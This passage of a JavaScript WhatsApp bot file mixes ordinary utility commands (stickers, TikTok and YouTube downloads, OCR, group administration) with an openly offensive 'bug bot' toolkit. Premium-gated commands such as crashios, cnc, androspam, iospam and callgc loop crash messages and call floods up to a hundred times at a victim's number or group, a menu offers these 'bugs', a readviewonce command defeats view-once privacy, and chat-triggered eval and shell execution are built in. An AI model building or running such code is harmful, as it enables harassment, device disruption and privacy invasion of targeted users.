                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        });

        // Format caption
        const cap = `*→ YouTube - Play*\n` +
            Object.entries(data.metadata).map(([key, value]) => `> *- ${key} :* ${value}`).join("\n") +
            `\n\nApin ~ 2025`;

        // Kirim gambar + caption
        await Ryc.sendMessage(m.chat, {
            image: { url: data.metadata.thumbnail.url },
            caption: cap
        }, { quoted: lol });

        // Kirim audio
        await Ryc.sendMessage(m.chat, {
            audio: { url: data.downloads["128kbps"].download },
            mimetype: "audio/mpeg"
        }, { quoted: lol });
    } catch (error) {
        ReplyRyc("Error! Unable to process your request.");
        await Ryc.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        console.error(error);
    }
}
break;

case 'eval': {
  if (!CreatorOnly) return;

  // Check if the message is quoted
  if (!m.quoted) return ReplyRyc(`Reply to a message with caption ${prefix + command}`);

  // Convert quoted message data to JSON
  let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
  let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`;

  try {
    // Save the JSON data to a file
    await fs.writeFileSync(jeneng, penis);

    // Send the JSON data as a reply
    await ReplyRyc(penis);

    // Send the saved file as a document
    await Ryc.sendMessage(m.chat, {
      document: { url: `./${jeneng}` },
      fileName: jeneng,
      mimetype: '*/*'
    }, { quoted: lol });

    // Delete the file after sending it
    await fs.unlinkSync(jeneng);

  } catch (error) {
    console.error("Error processing the eval case:", error);
    ReplyRyc("An error occurred while processing the eval case.");
  }
}
break;

case "rvo":
case "readvo":
case "readviewonce":
case "readviewoncemessage": {
  // Check if the message is a reply
  if (!m.quoted) return ReplyRyc("Please reply to a message you want to view.");

  // Check if the quoted message is a view-once message
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") {
    return ReplyRyc("This is not a view-once message.");
  }

  // Extract the quoted message
  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];
  
  // Supported message types
  const supportedTypes = ["imageMessage", "videoMessage", "documentMessage", "stickerMessage", "audioMessage"];
  
  // Check if the quoted message type is supported
  if (!supportedTypes.includes(type)) {
    return ReplyRyc("The quoted message type is not supported.");
  }

  try {
    // Download the content from the quoted message
    let media = await downloadContentFromMessage(msg[type], type === "audioMessage" ? "audio" : type.replace("Message", ""));
    
    // Prepare buffer array to store media
    let bufferArray = [];
    for await (const chunk of media) {
      bufferArray.push(chunk);
    }
    let buffer = Buffer.concat(bufferArray);

    // Send the media based on the type
    if (type === "videoMessage") {
      await Ryc.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
    } else if (type === "imageMessage") {
      await Ryc.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
    } else if (type === "documentMessage") {
      await Ryc.sendMessage(m.chat, { document: buffer, mimetype: msg[type].mimetype, fileName: msg[type].fileName || "file" });
    } else if (type === "stickerMessage") {
      await Ryc.sendMessage(m.chat, { sticker: buffer });
    } else if (type === "audioMessage") {
      let isVoiceNote = msg[type].ptt || true;
      await Ryc.sendMessage(m.chat, { audio: buffer, mimetype: msg[type].mimetype, ptt: isVoiceNote });
    }

    // React with success checkmark
    await Ryc.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (error) {
    // Error handling
    console.error("Error processing the view-once message:", error);
    ReplyRyc("Failed to process the view-once message.");
  }
}
break;

case "setpp": {
    if (!CreatorOnly) return ReplyRyc("*You're not my owner*");
    if (!quoted) return ReplyRyc(`Send Image / Reply`);
    try {
        let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
        if (!mime.startsWith("image/")) return ReplyRyc(`Bukan gambar, nih!`);
        if (/webp/.test(mime)) return ReplyRyc(`Sini muka lu ku tempelin stiker anjg!`);
        let media = await Ryc.downloadMediaMessage(quoted);
        if (!media) return ReplyRyc(`Gagal mengunduh gambar, coba lagi!`);
        await Ryc.updateProfilePicture(BotNum, media);
        ReplyRyc(`Success! Profile updated`);
    } catch (error) {
        console.error(error);
        ReplyRyc(`Aduhh, error nih 🥺: ${error}`);
    }
    }
    break;
    
//END
//DELETE PP CASE

case "delpp": {
  // Check if the user is the creator
  if (!CreatorOnly) {
    return ReplyRyc("*You are not my owner*");
  }

  try {
    // Remove the profile picture
    await Ryc.removeProfilePicture(Ryc.user.id);

    // Respond with success message
    ReplyRyc("Successfully deleted profile picture.");

  } catch (error) {
    // Handle any errors that occur during the process
    console.error("Error deleting profile picture:", error);
    ReplyRyc("An error occurred while deleting the profile picture.");
  }
}
break;

case 'tovn': {
  // Check if the quoted media is a video or audio
  if (!/video/.test(mime) && !/audio/.test(mime)) {
    return ReplyRyc(`Reply with a video or voice note and caption it with ${prefix + command}`);
  }

  // Ensure that the message is quoted
  if (!quoted) {
    return ReplyRyc(`Reply with video or voice note and caption it with ${prefix + command}`);
  }

  try {
    // Download the quoted media
    let media = await quoted.download();

    // Import the toAudio function
    let { toAudio } = require('../System/Data4');

    // Convert the media to audio
    let audio = await toAudio(media, 'mp4');

    // Send the audio as a voice note
    await Ryc.sendMessage(m.chat, { 
      audio, 
      mimetype: 'audio/mpeg', 
      ptt: true 
    }, { quoted: lol });

  } catch (error) {
    console.error('Error processing media:', error);
    ReplyRyc("An error occurred while converting the media.");
  }
}
break;

case 'hidetag': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");

  let message = q ? q : '';
  let mentionedUsers = participants.map(a => a.id);

  try {
    await Ryc.sendMessage(from, { 
      text: message, 
      mentions: mentionedUsers 
    }, { quoted: lol });
    ReplyRyc("Message sent with hidden tag.");
  } catch (error) {
    console.error("Error sending message:", error);
    ReplyRyc("An error occurred while sending the message.");
  }
}
break;

case 'kick': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");
  if (!Adm) return ReplyRyc("*Only Group Admins can use this command*");

  let users = m.mentionedJid[0] 
    ? m.mentionedJid[0] 
    : m.quoted 
    ? m.quoted.sender 
    : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!q) return ReplyRyc("Please mention a user or send their number.");

  try {
    await Ryc.groupParticipantsUpdate(from, [users], 'remove');
    ReplyRyc("Successfully kicked the user.");
  } catch (error) {
    console.error("Error kicking user:", error);
    ReplyRyc("An error occurred while kicking the user.");
  }
}
break;

case 'getlinkgroup': 
case 'getlinkgc': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");

  try {
    let responsegg = await Ryc.groupInviteCode(from);
    Ryc.sendText(
      from, 
      `https://chat.whatsapp.com/${responsegg}\n\nGroup Link: ${groupMetadata.subject}`, 
      m, 
      { detectLink: true }
    );
  } catch (error) {
    console.error("Error fetching group link:", error);
    ReplyRyc("An error occurred while fetching the group link.");
  }
}
break;

case 'resetlinkgc': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");

  Ryc.groupRevokeInvite(from);
  ReplyRyc("*Successfully reset the group invite link*");
}
break;

case 'public': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");

  Ryc.public = true;
  ReplyRyc(`*Success: Changed Mode from Self to Public*`);
}
break;

case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");

  Ryc.public = false;
  ReplyRyc(`*Success: Changed Mode from Public to Self*`);
}
break;

case 'ocr': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return ReplyRyc("Send / Reply Image");
  
  if (!/image\/(jpe?g|png)/.test(mime)) {
    return ReplyRyc(`Tipe ${mime} tidak didukung!`);
  }

  let image = await q.download();
  let download = await Ryc.getFile(image, true);

  try {
    let ocr = await ocrSpace(download.filename);
    await Ryc.sendMessage(
      m.chat,
      { text: ocr.ParsedResults[0].ParsedText.trim() },
      { quoted: lol }
    );
  } catch (error) {
    console.error("OCR error:", error);
    return ReplyRyc("Gagal membaca teks dari gambar.");
  }
}
break;

case 'tourl': {
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyRyc(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyRyc('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        console.error(error);
        return ReplyRyc('Failed to download media!');
    }

    const uploadImage = require('../System/Data6');
    const uploadFile = require('../System/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;

    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        console.error(error);
        return ReplyRyc('Failed to upload media!');
    }

    Ryc.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: lol });
}
break;

case 'sticker':
case 's': {
    if (!quoted) return ReplyRyc(`Reply Image or Video with command ${prefix + command}`);
    
    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await Ryc.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return ReplyRyc('max 10s');
        
        let media = await quoted.download();
        let encmedia = await Ryc.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else {
        return ReplyRyc(`Send Image or Video with command ${prefix + command}\nVideo duration only 1-9s`);
    }
}
break;

case 'brat': {
    if (!q) return ReplyRyc(`Example : Brat Brat Bret Brot`);
    
    const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`;
    await makeStickerFromUrl(imageUrl, Ryc, m);
}
break;

case "addbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
await Ryc.sendMessage(m.chat, { text: "*Silahkan Tunggu Kode Pairing Anda*" }, {})
if (m.key.fromMe) return
    try {
        await jadibot(Ryc, m, m.sender)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case "stopbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
await Ryc.sendMessage(m.chat, { text: "*Berhasil Menghapus Session!*" }, {})
    if (m.key.fromMe) return
    try {
        await stopbot(Ryc, m, m.sender)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case "listbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
    if (m.key.fromMe) return
    try {
        listbot(Ryc, m)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case 'tiktok':
case 'tt': {
    if (!qtext) return ReplyRyc(`Send command with link. ${prefix + command} https://`);
    
    let res = await tiktok(qtext);          

    if (res && res.data && res.data.data) {
        let images = res.data.data.images || [];
        let play = res.data.data.play;
        let lagu = res.data.data.music;

        const getMimeType = async (url) => {
            try {
                const response = await axios.head(url);
                return response.headers['content-type'];
            } catch (error) {
                console.error(error);
                return;
            }
        };

        let mimeType = await getMimeType(play);
            
        if (mimeType && mimeType.startsWith('video/')) {
            await Ryc.sendMessage(m.chat, {
                video: { url: play },
                caption: "Successfully downloaded video from TikTok"
            }, { quoted: lol });
        } else if (images.length > 0) {
            let totalImages = images.length;
            let estimatedTime = totalImages * 4;
            let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
            await Ryc.sendMessage(m.chat, { text: message }, { quoted: lol });

            const sendImageWithDelay = async (url, index) => {
                let caption = `Gambar ke-${index + 1}`;
                await Ryc.sendMessage(m.chat, { image: { url }, caption: caption }, { quoted: lol });
            };

            await Ryc.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" }, { quoted: lol });

            for (let i = 0; i < images.length; i++) {
                await sendImageWithDelay(images[i], i);
                await new Promise(resolve => setTimeout(resolve, 4000)); // Delay 4 seconds
            }
        } else {
            console.log('No valid video or images found.');
            await Ryc.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: lol });
        }
    } else {
        console.error('Error: Invalid response structure', res);
        await Ryc.sendMessage(m.chat, {
            text: "No media found or an error occurred while retrieving media."
        }, { quoted: lol });
    }
}
break;
      
case 'meta-ai': {
    if (!qtext) {
        return ReplyRyc('Send Text / Question');
    }

    try {
        const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
        const response = await fetch(apiUrl);
        const mark = await response.json();

        const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

        await Ryc.sendMessage(m.chat, { text: ress }, { quoted: lol });
        
    } catch (error) {
        console.error("Terjadi kesalahan segera hubungi creator!!!:", error.message);
    }
}
break;
    
case 'spamcall': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Spamcall 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Spamcall 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Spam Call Send To ${isTarget}*`);

    for (let i = 0; i < 5; i++) {
        await sendOfferCall(isTarget);
        await sendOfferVideoCall(isTarget);
    }
}
break;

case 'crashios': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n crashios 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .crashios 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! CrashIOS Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 10; r++) {
    await NewIos(isTarget);
    await IosMJ(isTarget);
    await QDIphone(isTarget);
    await QPayIos(isTarget);
    await QPayStriep(isTarget);
    await FBiphone(isTarget);
    await VenCrash(isTarget);
    await AppXCrash(isTarget);
    await SmCrash(isTarget);
    await SqCrash(isTarget);
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'cnc': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n cnc 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .cnc 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Crash No Click Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 100; r++) {
    await MSGSPAM(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'complex': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n complex 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .complex 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Complex Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 100; r++) {
    await CompleksButtons(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'epui': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n epui 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .epui 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Epui Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r <100; r++) {
    await EpUi(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'sql': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n sql 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .sql 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Sql Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 100; r++) {
    await InteractiveSQLRelay(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'carroussel': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n carroussel 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .carroussel 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Carroussel Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 100; r++) {
    await CrlButton(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'androspam': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n androspam 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .androspam 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Androspam Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 50; r++) {
    await sendOfferCall(isTarget);
    await sendOfferCall(isTarget);
    await sendOfferVideoCall(isTarget);
    await sendOfferVideoCall(isTarget);
    await MSGSPAM(isTarget);
    await MSGSPAM(isTarget);
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'iospam': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n iospam 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .iospam 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! iospam Send To ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 25; r++) {
    await sendOfferCall(isTarget);
    await sendOfferCall(isTarget);
    await sendOfferVideoCall(isTarget);
    await sendOfferVideoCall(isTarget);
    await IosMJ(isTarget);
    await NewIos(isTarget);
    await QDIphone(isTarget);
    await QPayIos(isTarget);
    await QPayStriep(isTarget);
    await FBiphone(isTarget);
    await VenCrash(isTarget);
    await AppXCrash(isTarget);
    await SmCrash(isTarget);
    await SqCrash(isTarget);
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'tester': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n DocFc 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .DocFc 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! DocFc sent to ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 2; r++) {
    await EpUi(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'callgc': {
    // Cek apakah fitur hanya untuk premium
    if (!PremOnly) {
        return ReplyRyc("*Khusus Premium!*");
    }
    
    // Validasi input
    if (!q) {
        return ReplyRyc(`Penggunaan salah.\nContoh: ${prefix + command} https://chat.whatsapp.com/`);
    }

    // Ekstrak kode grup dari URL
    let inviteCode;
    try {
        inviteCode = args[0].split('https://chat.whatsapp.com/')[1];
        if (!inviteCode) throw new Error('Invalid URL');
    } catch {
        return ReplyRyc("*Link grup tidak valid!*");
    }

    // Mencoba join grup
    let groupId;
    try {
        groupId = await Ryc.groupAcceptInvite(inviteCode);
        if (!groupId) throw new Error('Failed to join group');
        
        ReplyRyc(`*Berhasil! Force dikirim ke grup ${groupId}*`);
        
        // Eksekusi parameter
        await CrlButton(groupId);
        await CallGc(groupId);
    } catch (error) {
        return ReplyRyc("*Gagal bergabung ke grup atau mengirim force!*");
    }
}
break;

case 'critical': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!BotNum) return ReplyRyc("This Feature Only Send By Bot Number");

    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 5; r++) {
    await MSGSPAM(m.chat);
    await MSGSPAM(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break;
case 'combine': {
if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Combine 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Combine 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;
    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
  Ryc.sendMessage(m.chat, {
  caption: "Select Options Bugs", 
  image: { url: "https://files.catbox.moe/e20f25.jpg" },
  footer: "Apin Masih Pemula",
  buttons: [
    { 
      buttonId: `.about`, 
      buttonText: {
      displayText: 'About'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.tqto', 
      buttonText: {
      displayText: 'Tqto'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Options",
        "sections": [
            {
                "title": "Apin Still A Beginner",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "For Android",
                        "title": "Crash Android",
                        "description": "Message Spam",
                        "id": ".cnc ${isTarget}"
                    },
                    {
                        "header": "For Android",
                        "title": "Crash Android",
                        "description": "Complex Button",
                        "id": ".complex ${isTarget}"
                    },
                    {
                        "header": "For Android",
                        "title": "Crash Android",
                        "description": "Call Permission Reqruest",
                        "id": ".epui ${isTarget}"
                    },
                    {
                        "header": "For Android",
                        "title": "Crash Android",
                        "description": "SQL Relay",
                        "id": ".InteractiveSQLRelay ${isTarget}"
                    },
                    {
                        "header": "For Android",
                        "title": "Crash Android",
                        "description": "Carroussel Message",
                        "id": ".CrlButton ${isTarget}"
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "Crash Call",
                        "id": ".crashIos ${isTarget}"
                    },
                    {
                        "header": "Combo Android",
                        "title": "Bug + Call",
                        "description": "Crash + Spammer",
                        "id": ".androspam ${isTarget}"
                    },
                    {
                        "header": "Combo IOS",
                        "title": "Bug + Call",
                        "description": "Crash + Spammer",
                        "id": ".iospam ${isTarget}"
                    },
                    {
                        "header": "Call GC",
                        "title": "Bug Group",
                        "description": "Blank Chat Group",
                        "id": ".callgc ${isTarget}"
                    },
                    {
                        "header": "For All Device",
                        "title": "Spammer",
                        "description": "Call + Vidiocall",
                        "id": ".spamcall ${isTarget}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: null });
}
break
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRyc(bang)}
try {
ReplyRyc(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRyc(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRyc(evaled)
} catch (err) {
await ReplyRyc(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRyc(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ryc.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\